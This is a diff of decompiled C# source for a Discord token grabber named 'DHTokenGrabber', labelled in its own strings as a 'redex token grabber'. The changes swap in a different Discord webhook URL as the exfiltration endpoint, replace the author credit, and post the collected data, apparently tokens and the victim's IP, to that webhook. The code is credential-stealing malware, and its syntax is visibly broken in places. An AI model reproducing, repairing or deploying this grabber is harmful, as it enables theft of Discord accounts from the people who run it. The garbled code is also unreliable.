@@ -1,4 +1,4 @@
-https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A
+https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4
 namespace DHTokenGrabber
 {   
 // token: RID: 365 RVA: file Offset:
@@ -62,7 +62,7 @@ catch (Exception)
 }
 catch (WebException)
 }
-result = "unable to get  IP";
+result = "enable to get  IP";
 }
 return result;
 }
@@ -83,15 +83,15 @@ public static void sendWebHook(string discordWebHook,   string content)
                 }) + ""
             },
             {
-                "Nicolás Salazar"
+                "✿彡❤[𝓝𝓐𝓗𝓞𝓜𝓘]❤ミ✿#9921r"
                 "redex token grabber"
             },
             {
-                "https://www.facebook.com/photo/?fbid=224116535156503&set=a.224116551823168"
+                "https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4"
 
             }
         };
-        httpClient.PostAsync(https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
+        httpClient.PostAsync(https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
         catch (WebException)
         {
         }
